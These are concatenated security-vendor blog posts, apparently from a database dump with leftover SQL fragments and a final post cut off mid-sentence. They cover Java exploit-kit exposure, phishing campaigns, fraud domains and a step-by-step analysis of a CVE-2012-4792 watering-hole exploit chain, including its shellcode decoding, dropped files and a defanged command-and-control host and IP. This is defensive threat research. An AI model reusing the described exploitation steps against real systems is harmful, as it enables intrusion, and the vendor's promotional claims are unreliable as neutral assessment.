Of course you were — recent high-profile attacks have firmly established the trend, so we\'re not going to do yet another roundup here.\nInstead, let\'s drill in and try to understand the core problem. With so many vulnerabilities, it\'s hard to keep browsers up to date with the latest patched versions — especially because Java is updated independently from the browser. How hard is it? We decided to check.\nWe recently added Java version detection to our Advanced Classification Engine (ACE™) and pumped it into the Websense ThreatSeeker® Intelligence Cloud to get real-time telemetry about which versions of Java are actively being used across tens of millions of endpoints. Here\'s what we found (you may need to click on the graph to see all the detail):\n\n\nFigure 1: Global distribution of Java Runtime Environment versions based on active browser usage\n\nAs you can see, Java versions are all over the map. At the time of this writing, the latest Java Runtime Environment is 1.7.17, but only about five percent of the overall mix are using it. Most versions are months and even years out of date. How does this translate into the attack space?  \n\nExploit kits are a very common tool for distribution of many Java-based threats. From the billions of daily web requests being classified through our network, here is the breakdown of the active browser requests that are exploitable and which exploit kits have incorporated attacks for them.\n\nJava Vulnerability  Vulnerable Versions**  Vulnerable   Exploit Kits With Live Exploits\nCVE-2013-1493            1.7.15, 1.6.41                  93.77%         Cool  \nCVE-2013-0431            1.7.11, 1.6.38                  83.87%         Cool \nCVE-2012-5076            1.7.07, 1.6.35                  74.06%         Cool, Gong Da, MiniDuke\nCVE-2012-4681            1.7.06, 1.6.34                  71.54%         Blackhole 2.0, RedKit, CritXPack, Gong Da\nCVE-2012-1723            1.7.04, 1.6.32                  67.72%         Blackhole 2.0, RedKit, CritXPack, Gong Da \nCVE-2012-0507            1.7.02, 1.6.30                  59.51%         Cool, Blackhole 2.0, RedKit, CritXPack, Gong Da\n** All prior JRE versions below those listed are also vulnerable\n \nIt is probably no surprise that the largest single exploited vulnerability is the most recent one, with a vulnerable population of browsers at 93.77%. That\'s what the bad guys do — examine your security controls and find the easiest way to bypass them. Grabbing a copy of the latest version of Cool and using a pre-packaged exploit is a pretty low bar to go after such a large population of vulnerable browsers. Most browsers are vulnerable to a much broader array of well-known Java holes, with over 75% using versions that are at least six months old, nearly two-thirds being more than a year out of date, andmore than 50% of browsers are greater than two years behind the times with respect to Java vulnerabilities. And don\'t forget that if you\'re not on version 7 (which is 78.86% of you), Oracle won\'t be sending you any more updates even if new vulnerabilities are uncovered.\n\nHow do you stop the onslaught if the patches aren\'t keeping up? Given the complexity and dynamism of exploit kits and their updates, exploit signatures do not suffice. Our protection model against new Java exploits is to use our analytics and real-time telemetry to proactively intercept new instances at every step of their attack strategy. Most prominently, ACE covers the exploit kit/exploit phase with a fine-grained knowledge of the expressible threats from all of the major kits, including not just the vulnerabilities, but also the obfuscation techniques, redirection techniques, and re-packaging of their dropper files. Here are just a few other ways we interrupt the malware kill chain to make it harder for the bad guys to drive right through this sizable hole in current IT infrastructure: \nReal-time intelligence to block lures, phishing, and other forms of social engineering coming across web, email, and mobile platforms\n  Real-time inbound intelligence to identify known or suspicious malware destinations and compromised sites \n  Real-time outbound intelligence to identify command and control communication, bot networks, dynamic DNS requests, and fingerprinted data headed to the wrong people or places\n  Identifying malicious droppers both statically and behaviorally (via Websense ThreatScope™) \nIt\'s clearly not just the zero-day attacks that should be getting all of the attention.', 'https://www.forcepoint.com/security-labs/how-are-java-attacks-getting-through\n');

We also announced the availability of the first solution in our joint development roadmap.\n\nWhy does this matter?\n\nOrganizations today face increasingly sophisticated and targeted cyber-attacks that hit multiple attack vectors. The two primary targets are an organization\'s web application servers and its employees accessing the web.\n\nWeb application servers are targeted because they are public-facing and often have access to sensitive information in backend databases. As a result, they are subject to denial of service and application vulnerability and HTTP protocol exploitation attacks. In many cases, these web servers, once compromised, are used to drive redirects, host exploit kits and code, or deliver malware payloads because the site\'s good reputation passes traditional security defenses. Positioned in front of these web applications, F5\'s Application Delivery Controller is ideally positioned to thwart these types of web application server attacks. When Websense\'s advanced threat detection and data loss prevention (DLP) capabilities are added to this web application firewall platform, the joint solution becomes \"content-aware.\" This provides a much higher degree of security against evolving threats.\n\nEmployees are also targeted due to their privileged access to information and their susceptibility to spear-phishing and other social engineering techniques. These attacks often lure users to web destinations that redirect to servers hosting exploit kits used to detect open vulnerabilities or open doors into the user\'s system resulting in silently downloaded and installed malware. Once installed, the malware often checks in with command and control centers before carrying out its instructions that may involve data theft. Websense\'s real-time security capabilities can detect and defend against each of these kill chain stages as utilized by advance threats.\n\nWhat do both web application and employee attacks have in common?  Both attempt to acquire access credentials, infect, steal sensitive data, and in many cases are components of a broader attack on an organization that may also include disrupting commercial services.\n\nThe Websense / F5 joint solutions solve this problem by protecting both web application servers and employees from cyber-attacks. The solutions enable organizations to secure their entire enterprise footprint by protecting sensitive data from both inbound attacks and outbound exfiltration.  I.T. administrators have access to a consistent set of security services deployed across both gateways: the web application firewall and the secure web gateway.\n\nThis solution optimizes interoperability of the BIG-IP platform and Websense V-series and X-series appliances, bringing together the industry\'s most effective security defenses  and the industry\'s most scalable networking.

However, there were numerous cloud discussions at the water cooler and rightly so. Cloud adoption is soaring. Laptop/mobile users exceed 50 percent at some companies. Many remote employees are accessing the internet and exposing vulnerable data.

At one booth, folks dressed up like the Star Wars characters and were taking pictures with attendees. A few vendors were giving away swords that glowed, had someone dressed up like a robot, and there were 80’s arcade games.

The Gartner Magic Quadrant for Content-Aware Data Loss Prevention reports that content-aware DLP will be the standard of due care by 2013 in North America, and by 2015 in Europe and the Asia/Pacific region. Recently released, this report includes all major industry players. Below are five ways this report can help you to define your DLP strategy:\nIdentify the market leaders to help you determine the DLP vendor of your choice\nLearn how to use DLP as a control for the protection of your intellectual property\nDetermine the best way to deploy your DLP solution\nUnderstand how to incorporate your DLP solution as part of your business process\nLearn about the technological advances in the DLP space\nWe are very pleased that for the sixth year in a row Websense is an industry leader in this report. We believe this recognition acknowledges ou dedication to a content-aware DLP solution that supports endpoint, network and data discovery.\n\nHow is your organization addressing data theft and loss concerns? Do you have a DLP solution in place to effectively safeguard your intellectual property? Are you concerned about securing remote workers who may access sensitive information while offline?

First, last year, there was a significant amount of growth in threats - pretty much from every vector. We saw increased spam, phishing, and mobile threats started to show up, even in legitimate stores.\n\nWe can\'t get into the details at this stage, but we saw massive growth in all the web-based threats.

The article then goes on to recount details of the investigation in what has evolved into a very public case study on the challenge of protecting an enterprise with the inherent limitations of antivirus technology. \n\nThe question has loomed for some time about the real-world effectiveness of antivirus-based endpoint technologies and their complementary \"next generation\" adaptations. But in this case, it may finally be decided beyond a shadow of a doubt, antivirus is simply not equipped to address today\'s attacks against businesses.\n\nIs your business safe from malware with this dated approach to systems and data security?\n\nRelying on solutions like antivirus which is generally 30-50 percent effective is simply not acceptable. Instead, as security professionals we need to suggest that \"enough is enough,\" and proactively seek out solutions that are more sophisticated.\n\nFew businesses will actually be a victim of the advanced persistent threat (APT) bogeyman, but there is overwhelming evidence that their chances of becoming a victim of a targeted attack are growing with each day. This incident illustrates with a degree of certainty that antivirus is ineffective at protecting users, data, and the cloud. Without real-time detection and analytics, we cannot reach true, consistent security effectiveness. We need to continue to work to expose this truth that still seems hidden to many of our peers.\n\nWhat are the next steps? What do we take away from this that makes our jobs less risky? As a fellow security professional, if you are charged with protecting your company\'s systems and data, I would examine the following:\n\nEvaluate the effectiveness of the solutions in place\n\nTest your policies, practices and solutions in your environment to get an understanding of how effective they really are. Use red team exercises with your brightest minds donning the blackest hats to crack your network. Penetration testing, social engineering and application testing should be combined with a thorough internal/external policy. Then implement a practice review to maximize the test\'s effectiveness and develop countermeasures and remedies to mitigate any exposed risk. Remember, like an Olympic athlete, its practice, practice, execute. Just because the Olympics is held every four years doesn\'t mean those athletes aren\'t honing their skills in preparation every day prior.\n\nSolution investment\n\nTake a look at the percentage of budget you currently have allocated to dated technologies. If you have a large investment dedicated to ineffective solutions, it may be time to integrate or replace them with more sophisticated tools geared toward today\'s evolving threat landscape. This seems like a given, right? Except, you may have inherited this budget line and solution when you moved into position. Often times these things are passed along to successors, and too infrequently do we stop to scrutinize them.\n\nAssess your risk and investigate inbound email sandboxing\n\nChecking the safety of an emailed link not just as it enters the mailbox, but as a user clicks on it will pay off in the end. This protects against a new phishing tactic created by cybercriminals to avoid URL lookup incorporated into some email security solutions. Bad guys send an email with a brand new, or clean but compromised URL, to their targets. After the lure is in the old inbox, they can inject malicious code into the website after delivery. No one said the bad guys weren\'t ingenious. Many of them know security solutions as well, if not better than we do.\n\nInspect your web traffic in real-time\n\nYou need to protect users in multiple ways. Even if you have inbound email sandboxing for your corporate email, some users might click on a malicious link through their personal Gmail account and be directed to a malicious site. In that case, your corporate email spear-phishing protection is unable to see the traffic. The end result is that your network is compromised. We must stop malicious URLs from even getting to users by catching them in the gateway. Email and web security must work in unison. Bottom line is your web security gateway needs to be intelligent, analyze content in real time, and be effective at stopping inbound and outbound malware.\n\nIt\'s not just about technology\n\nYou are only as strong as your weakest link. The human element is incredibly important to your security posture. Many CSOs I\'ve spoken with are adopting employee testing programs and conduct this training on an ongoing basis. The result isn\'t really just employee education or security awareness - it\'s behavior modification. By doing this, we are both adjusting the likelihood of employees creating a risk incident and using technology to reduce or eliminate employees\' and users\' risk profiles.', 'https://www.forcepoint.com/insights/practical-it-key-takeaways-new-york-times-breach\n');

How did this breach occur? As described in media coverage surrounding the debacle, a user within the MIT Network Operations Center (NOC) received an email containing a malicious link. The user subsequently clicked on the link and from there the attack proceeded. In its simplest terms, hackers exploited the user to redirect all traffic destined to any MIT URL to an external site, outside of MIT\'s control.\n\nMIT regained control of its systems within hours and kept the total visible impact to just a few days - the length of time it took for DNS records to be updated across the globe. But that\'s not the point. If information security programs are dependent on users (or employees), there are only two remedies: users need to become more aware or security needs to remove the threat to their users.\n\nThis deliberate attack stemmed from a simple phishing email to a user. What we don\'t know is how many users within the MIT NOC received the email and how many did not click on the link. The lesson here? It only takes one user to lead you to a compromise.\n\nSecurity departments across the globe need to invest resources to protect their employees against phishing attacks. The top three solutions to reduce risk include:\n\nRepetitive user training with published metrics with a goal of behavior modification\n	Effectively blocking malicious emails from entering the network\n	Proven technologies that block the user from reaching malicious websites\nUntil users become aware of suspicious links and attachments within an email, it is absolutely essential that security teams implement protective measures. In this dynamic threat landscape, investing resources in shoring up the weakest links should be the primary focus of all information security professionals.

The implementation of two-factor authentication would be a welcome addition to Twitter’s service which, based on figures released in 2012, has an estimated 500 million users, of which 200 million are estimated to be ‘active’.\n\nThe recent compromise is reported to impact 250,000 users, a mere 0.0005% of total users or 0.00125% of active users, and therefore may seem a somewhat small drop in the Twitter ocean. It is not unsurprising, therefore, that attackers are continuing to target Twitter users by dumping a barrel load of phish into this metaphorical ocean.\n\nThis recent phishing campaign, given the samples analyzed by Websense Security Labs so far in this incident, is using lures likely to elicit a click when received from a friend or associate, such as Did you see this pic of you? lol followed by a shortened URL.\n\nInterestingly for us, and hopefully you, the use of Bitly’s URL shortening service allows us to append the URL with a plus ‘+’ and then view statistics for the shortened URL:\n\n\n\nWhilst the click rate for the above example is low, we’ve seen numerous unique Bitly shortened URLs related to just one account, and would expect the perpetrators behind this campaign to rapidly cycle these in order to avoid detection and to increase the chances of catching more victims.\n\nFrom all of the Bitly URLs analyzed, the statistics indicate that the victims are not confined to any one geographical area and that users are following the links. With regard to the small percentage of non-Twitter referrers, these could be Tweets or Direct Messages accessed via other applications or  indicative that the campaign is not limited to Twitter itself.\n\nOnce followed, the shortened URLs lead to what appears to be an intermediate and changing subdomain on hecro(.)ruwhich in turn redirects to active phishing sites hosted on a variety of typosquat-style domains:\n\n\n\nThe phishing URL in the above example, Tivtter(.)com (ACEInsight Report) appears at a glance to be legitimate and therefore is likely to dupe some unsuspecting victims into believing that they need to \'re-login\' to their expired Twitter session. The URL in this example also appears to cycle through an alphabetic sequence of folders containing the phishing page, perhaps in order to gather some statistics or to split the campaign in some way, as we\'ve seen active examples from/a/verify/ upwards (/n/verify/ at the time of writing). Once the letter has cycled onto the next, any attempt to access the phishing page will be met with a standard  \'404 - Page not found\' error.\n\nShould you fill in your account credentials, they\'ll be snaffled by those behind this nefarious scheme and you\'ll be presented with a fake \'404\' page not found error before being whisked back to the official Twitter Web site as if nothing happened:\n\n\n\nAs well as the URL above, we\'re also seeing other variations on the same Twitter typo theme including iftwtter(.)com(ACEInsight Report) and iwltter(.)com (ACEInsight Report).\n\nReassuringly, Bitly are flagging many of the shortened URLs as ‘potentially problematic’ although it is likely that for every one flagged another is sure to emerge.\n\nWhilst Websense customers are protected from phishing and other threats by ACE, our Advanced Classification Engine, please do ensure that you check your personal accounts as well as sharing some basic security tips with your friends and family!\n\n[Update]\n  Friday, July 19, 2013:\n\n\nWebsense Labs has been tracking a mutation of this campaign, once again spread via Direct Messaging (DM). The offending domain is a typo-squat - hxxp://twitller(.)com ( Ace Insight Report ), This URL, if browsed to directly, will redirect the visitor to the legitimate https://twitter.com page. However, the URL being DM\'d is: hxxp://twitller(.)com/at1/index.php ( Ace Insight Report ) - this page uses xmlHTTP to communicate with a third party web application, in order to generate a random URL, similar to hxxp://twitller(.)com/9wk45b/verify/?&account_secure_login - this is where the Phish will happen, exactly as described above.\n\nWebsense customers are proactively protected from this campaign.\n\nThanks to @JanneFl for the initial identification of this campaign.', 'https://www.forcepoint.com/security-labs/battered-twitter-phish-no-chips-updated\n');

We detected the exploitation code for the vulnerability CVE-2012-4792 and analyzed the Flash file which was used to contain the heap spray code and the shell code. In this part we are going to show some of the details that we extracted from the shell code and from behavioral analysis of the malware installed after a successful exploiting attempt. We have also added some details related to the domain name using the WHOIS records and internal data.\n\n\n	Why are waterhole attacks occurring? What is the attackers\' objective, both here and in other cases? As we learned from this analysis, the malware is used to steal files from compromised computers, while also enabling monitoring of the user\'s emails and other activities. We also found suspicious ties to sites potentially targeting high technology suppliers, perhaps in Taiwan. Read on for details of the attack.\n\n\n	From the shellcode contained in the SWF file mentioned in the first part of this blog, we have extracted and disassembled, specifically, the Windows XP shellcode. To do this, we used the tool shell2exe which allowed us to obtain a consistent PE file by inputting the sequence of bytes of the shellcode. There is also an online version of this tool provided by sandsprite.org. In the following screenshot we can see the first stage which decrypts the remaining code using the XOR key \"2Eh\":\n\n\n	\n\n\n	After this first stage the execution flow is passed to the code just decrypted, which, as its first action, tries to create a file in the operating system temp path named \"dw20.exe\":\n\n\n	\n\n\n	Another interesting detail is the search in memory for the string \"KONG\" which as mentioned in the first part of our analysis, has been used as a prefix of the content of the variable \"THISISIT\" in the first HTML code from which we started this analysis. So, once this string is detected in memory, the file created previously, \"dw20.exe\", is filled up with the value of the array \"THISISIT\" stripped of the marker \"KONGK\":\n\n\n	\n\n\n	Once the encoded file is detected in memory it is passed to another assembly routing which applies another XOR operation using the key \"BFh\":\n\n\n	\n\n\n	Following the logic of the shell code, we had extracted the encoded stream and applied the XOR on it, obtaining a file with MD5: 1ad6afeec913f4c3a0ffce0093cddf21. At this time the file seems to have a low detection as reported here. We submitted this file to the Websense® ThreatScope™ service with the following result:\n\n\n	\n\n\n	The full report is available here. The initial lookup of this .EXE file seems to produce some suspicious details. Firstly it is signed with an invalid certificate as shown below:\n\n\n	\n\n\n	A suspicious resource section named  \"DATA\" was also detected, which is loaded and decrypted at runtime:\n\n\n	\n\n\n	The code where this resource is referenced was found during the dynamic analysis, and is loaded afterwards by the function called at the address 0x00403f02:\n\n\n	\n\n\n	Following the execution of this file, we noticed the creation of the file \"ntshrui.dll\"  and the use of the Windows system file: \"wdmaud.drv\": \n\n\n	\n\n\n	The file \"ntshrui.dll\" has been submitted to Virustotal and the report again shows a low detection of malware, but thanks to these two file names we located a Microsoft report, from which we can deduce that we are talking about the same family of malcode (named Fucobha.A). From the Microsoft analysis it is also possible to see that while this malware is used specifically to download files from the impacted systems, it also permits monitoring of emails and the user\'s activity. Also, the report shows that the same behavior is used in the persistence mechanism as an injection in a new instance of the process \"explorer.exe\" as shown here:\n\n\n	\n\n\n	In the previous screenshot, it is possible to see unusual network activity in the process \"explorer.exe\" - in fact, once executed, the malware contacts the host \"hxxp://www.rotary-eclub.com\" ( IP address 118.212.64.23 TCP port 4356 ) to start sending information gathered from the impacted system as follows:\n\n\n	\n\n\n	As is possible to see from the network traffic, the information exchanged between the impacted system and the C&C is encrypted:\n\n\n	\n\n\n	The first message contains encrypted basic information (such as the operating system version, installed service pack, local IP address and so on) for the impacted system.  We tried to analyze the injected code in the process \"explorer.exe\" and discovered the parser that handles the commands once they are decrypted. Here we can see the check for two specific commands: \"ptt\" and \"skc\":\n\n\n	\n\n\n	The WHOIS information for the C&C \"hxxp://www.rotary-eclub.com\" provides a strong link with the host \"hxxp://www.rotary-eclubtw.com\" as shown below:\n\n\n	\n\n\n	Here is the WHOIS information for the C&C domain:\n\n\n	\n\n\n	By googling for YOVOLE.COM, we found that this Chinese Service Provider has been reported as one of the most active for phishing related attacks as detailed in this report. Also, using our internal database we detected that the registrant \"2207406762@qq.com\" has recently registered other interesting domain names. Specifically:\n\n\n	\n\n\n	From this it is possible to detect a weird coincidence: zhiaoit and zy-intl are keywords which on Google provide results related to high technology suppliers as shown below:\n\n\n	\n\n\n	Still another note: using the location address gathered from the WHOIS information, we can see via Google Maps the geographical location where the C&C is hosted is actually just across from the island of Taiwan:\n\n\n	\n\n\n	Websense customers are protected from these and other threats by Websense ACE (Advanced Classification Engine).', 'https://www.forcepoint.com/blog/security-labs/cve-2012-4792-and-spear-phishing-rotary-domains-part-2\n');

A single incident of data loss can erode a business\'s competitive advantage, weaken consumer confidence and result in fines or penalties from regulators.\n\nYesterday, I was discussing this with some peers. Together we came up with a few best practices to help stop data breaches and their damaging repercussions. Here are a few of the suggestions we came to agree upon:\n\nThe web channel is one of the most compromised data loss vectors. Your security plan should incorporate user and business unit-based policy requirements for uploading data to the web.\n	Users often interact with sensitive data while off the corporate network. Remembering this and taking precautions for off-network endpoint protection can pay dividends.\n	Implement a strong and enforceable encryption policy for sensitive data being transmitted to USBs.\n	Before purchasing or deploying any security solutions, have a methodology and execution strategy established.\nUltimately, data breach prevention isn\'t just about stopping data from escaping. An effective approach looks at monitoring both inbound and outbound traffic to: distinguish and stop data stealing attacks from getting in; assess in real-time and possibly take action to prevent data moving out of your control; and do this in a manner that doesn\'t slow down the legitimate communications that businesses need to function.\n\nWhat is the single most effective action you have taken to stop data loss in your organization?', 'https://www.forcepoint.com/insights/best-practice-tips-cios-how-prevent-information-leaks\n');

Since the Rotary Club is a worldwide organization, each country has a number of  local \"clubs\" for each region and they have also established an online service called  \"Rotary eClub\".  \n\nSpecifically, we discovered another attempt to exploit the Internet Explorer vulnerability CVE-2012-4792, which was discovered in a \"water holing\" attack against the USA Council of the Foreign Relations website (http://www.cfr.org). The results of our analysis were in accordance with those reported in this blog: apparently another worldwide campaign against several organizations which have in some way attracted the interest of the attackers due to the specific audiences for their sites. In this first part of the analysis, we will report our investigation into the obfuscated code and the exploit code detected. In the second part, we will present the analysis of the unusual mechanism implemented in the shellcode that runs the malware which is installed if the exploit is successful. We will also look at some details of the malware behavior and expose some details behind the involved domains and the infrastructure of this attack.  \n\nThe suspicious domain in our analysis is \"rotary-eclubtw.com\", which has apparently been registered to target the Taiwanese users of the Rotary eClub service as shown in the following screenshot:\n\n\n\nTo find more information about the Rotary eClub located in Taiwan , we used the regional \"Club\" locator available on the Rotary official Web site:\n\n\n\nOne of the interesting results from that research is as follows:\n\n\n\nThe comparison between the domain under investigation (hxxp://rotary-eclubtw.com) and the legitimate Web site http://www.rotaryeclub.org.tw appears to show a case of typo-squatting, and the maliciousness of that domain is confirmed by looking at the content, as shown below:\n\n\n\nAt first glance, the content seems to be split into two well-defined blocks. Further analysis confirms that the same page hosts the malicious script that is assigned to the JavaScript variable \"c\" as shown below, and an encoded stream assigned to the variable \"THISISIT\":\n\n\n\n\"THISISIT\" is the container for a stream which at first glance seems to be a nonsense array of characters with a prefix \"KKONG\". In the next part of our analysis we will better understand the role of this specific \"marker\" and how it has been used by the attackers.\n\n\n\nThe main function which is called during the loading of the page is the function \"download()\" referenced in a HTML object named  \"test\":\n\n\n\nBy deobfuscating the value of the Javascript variable \"c\", we obtain the clear code and can see that the \"download()\" function is implemented in the first obfuscated block mentioned before. It uses the API XMLHttpRequest()  to detect the correct version of the Ajax dialect to use for dealing with the dynamic HTML modules of this exploitation mechanism:\n\n\n\nWe can also see the call to the function \"callback()\":\n\n\n\nThis is an Ajax convention to verify the availability of one file. The function callback() is called if available to gather information about the impacted system in order to guess the best pairs of parameters to start the exploitation process. For this reason, it is possible to detect the code used to guess the operating system version or, as reported below, for the detection of a Microsoft Office module available on Windows 7. This specific check is useful for the attackers because if one of the two ActiveX controls (SharePoint.OpenDocument.4 or SharePoint.OpenDocument.5) is present in the running operating system, they can use that to gain access to a specific DLL, distributed by default on Windows 7 systems, which permits the running of malicious code by bypassing memory randomization protection mechanisms such as ASLR:\n\n\n\nTo continue with the implementation of the \"callback()\" function, we notice a reference to another file named \"DOITYOUR02.html\" in each  \"<object>\" section:\n\n\n\nThe file DOITYOUR02.html looks like this:\n\n\n\nwhich once decoded becomes:\n\n\n\nThe \"load()\" function is an Ajax function that loads data from a server and puts the returned data into the selected element. In this case the element is  \"test\": the same name as the HTML object mentioned before. This makes it as a unique HTML object used by all the dynamic HTML modules during the exploitation process. Following the code of the function \"loader()\", it is possible to detect the removal, through the regular expression, of the string \"jj\" from the obfuscated content stored in the file \"DOITYOUR01.TXT\". Following this step manually:\n\n\n\nwe obtained an hexadecimal stream:\n\n\n\nwhich converted to ASCII became:\n\n\n\n \n\nThe code above is the exploit code which is responsible, due to an \"user after free\" bug, for triggering the Internet Explorer vulnerability (CVE-2012-4792). This vulnerability is also called \"CButton IE 0day\" and in the snippet of code above, the steps to reproduce the \"user after free\" bug are highlighted in red. By working backwards it is possible to see the big picture of the flow: if the conditions for exploiting this vulnerability are good, the Flash file named \"logo229.swf\" is executed, and in the meantime the exploitation code hosted using the HTML file \"DOITYOUR02.html\" is also executed as reported before. \n\nThe SWF file contains the heapspray code which facilitates the arbitrary code execution if the exploit is successful. Looking into the SWF file, we can see that is not the real heapspray code that we expected, but just a loader of another SWF file created \"in memory\": \n\n\n\nThe content above is the disassembled ActionScript code which, after Base64 decoding, created in memory and ran another SWF file. To obtain the original file we used this easy and dirty Python script:\n\n\n\nFrom this SWF file, we finally got access to the ActionScript HeapSpray code as follows:\n\n\n\nThe call of the ActionScript class \"ExternalInterface\"  permits a straightforward communication between the ActionScript code executed by the FlashPlayer and the SWF container. In our case the container is the starting HTML which is provided when calling the suspicious Web site:\n\n\n\nWe can also see the use of the ID \"test\" as already highlighted several times. The value returned is assigned to the variable \"_loc_3\" and is used to detect the correct sequence of the ROP instructions and the shellcode to run. What follows is the use of the variable _loc_3 to select the best Windows7 conditions to run the malicious payload :\n\n\n\nThe malicious file to be executed is loaded by the shellcode looking in memory rather than for a file in the Web cache, as happened in the attack against the CIFR.ORG Web site. This is a interesting difference because it means that the chain of attack uses fewer files which can be detected by an AV for example. The shellcode has been extracted by the malicious SWF file obtained previously:\n\n\n\nIn the next part we will look at the shellcode and the dropped malware, discussing an interesting technique used in this attack to deliver malware using only the HTML content. This is a little bit different from the first attack where this Internet Explorer vulnerability was discovered, since for the cfr.org Web site attack, the malware was deployed on visitors\' systems with a technique called \"drive by cache\", using a file with the extension \".jpg\" (named \"xsainfo.jpg\") to contain the executed malware. In this case, it seems that the malicious file is retrieved from the rendered content in the memory of the initial HTML page. We will also look at exposing information and details about the infrastructure behind the involved hosts and domains. \n\nWebsense customers are protected from these and other threats by Websense ACE (Advanced Classification Engine).', 'https://www.forcepoint.com/security-labs/cve-2012-4792-and-spear-phishing-rotary-domains-part-1\n');

Way back in Nov. 2011, we were told that if we had Java 6 Update 29 or Java 7 update 1, we wouldn’t be vulnerable to the security weaknesses in the headlines. Yet, with each update vulnerabilities continue to be discovered and exploited. We even had two Java 0-day exploits included in kits before Oracle had patches prepared. Yet despite the patches, we continue to hear about new vulnerabilities. \n\nProtecting websites from exploitation\n\nEnd user infections occur when a user visits or “drives by” the website hosting the exploit code. These websites are most frequently legitimate sites that have been compromised. Meaning that the clean site you visited yesterday is now infected. \n\nIf you are a website administrator, this can make life challenging. You have to routinely inspect all of your internet-accessible servers and frequently ensure that you are not contributing to machines being infected across the globe. One way to do this is through a solution that can categorize all installed software as “known-good” or “known-bad,” based on the latest public notices, and even blacklist or whitelist applications.\n\nFile Integrity Monitoring (FIM) and Change Detection tools are also useful to alert you when modifications have occurred on your systems. \n\nDon’t let endpoints be your downfall\n\nIn an ideal world you would uninstall Java completely from all of your endpoints. I would say the same thing about any program that has been as challenged by vulnerabilities. But with Java installed on more than three billion devices worldwide, this could be a daunting task.\n\nPatching could be a sufficient countermeasure; if patches existed. However, the window of exposure from exploit proof-of-concept to patch is too much of a risk for most organizations. Even when patches are available, machines across the globe are still not being patched. Three of the top ‘Top Web Exploits’ for Jan. 19 are exploited vulnerabilities with patches that were available for more than three years. Unfortunately, AV isn’t a help in this arena, because while the exploits may be old, the binaries are often too fresh for signature matching.\n\nSo what to do? Based on my discussions with other pros and my own experience I’ll be presenting a series on how to mitigate Java risks to protect your endpoints. We’ll look at: Proactive; Immediate; and Long-Term prophylactic measures. Here’s what you can start acting on now:\n\nNotify your executive team of the risks associated with Java. Education is part of your role, and it may even help you gain incremental budget.\n	Know what has been deployed in your environment and on what systems; and uninstall Java on all systems if it is not needed.\n	If Java is needed, make sure you have a strong patch management program in place. You can also tweak the Java security settings to increase your posture. You can quickly review how to change the security settings in Internet Explorer at http://support.microsoft.com/kb/182569. I’ll elaborate on this in more detail in a future post (I’ll also explain why I don’t necessarily believe in the two-browser approach some are touting).\n	Ensure your Intrusion Detection Systems are configured to look for old Java versions, which can stay on an endpoint even after installation of newer versions.\n	Don’t forget your laptops when they’re not connected to the network! This can be a blind spot if you don’t have cloud protection services.\n	Protect your network using a solution that sees vulnerabilities in real time and can stop them before impacting your environment.\n	Auditing and logging can be your friends. The easiest method is to get this rolling via a Group Policy within Active Directory (AD), assuming your computers are part of an AD Domain. The next obvious step would be to monitor your logs! If a tree falls in the forest…\n	Ideally, your logs are being sent to a SIEM for analysis. Logs can be leverage to validate the preventative measures you have put in place are effective.\n	This could be a prime opportunity for IT to have the ability to make real changes in their environment and ultimately reduce the company’s exposure to current and future threats!\nYou’ve probably got all these concepts already in place, so in the next post we’ll begin to address Immediate and Mid-Term Planning.

Yes, even the recent disastrous weather experienced on the east coast of the United States was exploited to try and obtain valuable information that could be used for identity and monetary theft from grief-stricken or worried families and friends. \nThe New Year and its first month brings with it the familiar drive of businesses trying to clear stock, slashing prices to entice us to part with our money and to snap up a bargain in the process. Our desire for a great bargain is something not unknown to the bad guys – they are very aware that we might just be tempted to go for that seemingly ‘too good to be true’ bargain. The associated costs to fraudulent websites are minimal compared to the numbers game the bad guys play; they cast a wide net and you may be the catch of the day.\n\n\nLet us explore this further through an example. A Swarovski (the brand name of a popular crystal jewelry manufacturer) fraudulent site was detected by the Websense® ThreatSeeker® network. The site hxxp://www.swarovskisale.co/ purports to be selling discounted Swarovski jewelry. The first indicator that something may not be all that it seems is the Top Level Domain, .co. Proving popular among the bad guys due to its lexical relationship to the .com TLD, the .co TLD is assigned to Colombia.\n\nThe policies regulating the registration of the .co TLD allow for all persons or entities with no domicile in Colombia to register a .co domain. We searched our Websense Security Labs™ database to see if this brand name was being abused; a number of results were returned. Further investigations of the registrants\' records revealed that a common thread among the results was that the sites are registered to a common entity.\n\nThe registration details appear to be random text, while the email address follows the theme seen here: louisvuitton563@hotmail.com. Using that information, a search of the Websense Whois DB revealed 1500+ websites following this pattern and/or including these same registration details.\n\n\n\nHere are some examples:\n  mulberryorderonline.com\n  nikenfljerseyspro.com\n  nikenfloutlet.com\n  taschenlouisvuitton-de.info\n  uggbootssoutlettonline.com\n  prada-fr.info\n  abercrombies-fra.info\n  abercrombies-fre.info\n\nAt the time of writing this blog, the majority of the examples listed above were parked with GoDaddy and registered in October 2012. We can assume here that these sites will be used in the near future in spam or phishing campaigns.\n\nIn conclusion, the old adage of caveat emptor still applies even in the virtual shopping world. Be aware when online; if it sounds too good to be true it most probably is. Websense can help to protect you from these fraudulent sites.

Exploitation can then result in memory corruption, which in turn could allow an attacker\'s own code to be executed within the context of the current user, or as if it was being run by that user.\n\nAt this time, Microsoft has not released a patch in order to address this vulnerability. However it has provided an easy one-click \'Fix It\' solution. Internet Explorer versions 9 and 10 are listed as not being vulnerable. \nWebsense Security Labs™ are continuing to monitor this situation and, as a member of the Microsoft Active Protection Program (MAPP), are working with Microsoft in order to provide the best protection to our customers. \nUpdate:\nMicrosoft has issued an Out Of Band update for CVE-2012-4792, which you can read about here.', 'https://www.forcepoint.com/security-labs/happy-new-year-and-unhappy-new-ie-zero-day-cve-2012-4792\n');

In the past 48 hours we\'ve seen a rapid increase of a particular scam campaign that has aggressively spread through the world\'s largest social networking site. \n\nWith the holiday shopping season here, it appears that cybercrooks are going full throttle to attract Christmas shoppers by piggybacking on the reputation of well-known brands such as Walmart, Asda, Visa, Best Buy, Apple and others. In the attack that we\'re about to describe, it appears that user accounts belonging to the free DNS service freedns.afraid.orgwere used as part of the cybercriminals\' scam infrastructure. Read on for details. \nThe scam varies in appearance, is geolocation aware, and serves content based on the location of the victim. Potential victims are enticed with videos and free shopping vouchers. Here are some examples of how it might look in a Facebook news feed:\n \nThe scam in a Facebook news feed \n\nWhat happens when a scam post is clicked?\n \nWhen a scam link is clicked in the news feed, the victim is redirected to a fake Facebook page that hosts a fake video that pretends to show the \"Fail Blog Daily Video.\" A clickjacking technique is employed on the page so that when the victim clicks on the video\'s play button, it results in one of two outcomes: \n1. A browser popup is launched and the victim is asked to \"Like\" a certain scam post. This is done to propagate the scam further because liking it causes it to appear on the victim\'s news feed.\n(Click here to see what it looks like; a new browser window will open.) \n2. The victim is redirected to fake video page that uses the CPA advertising method to \"unlock\" what is supposedly a YouTube 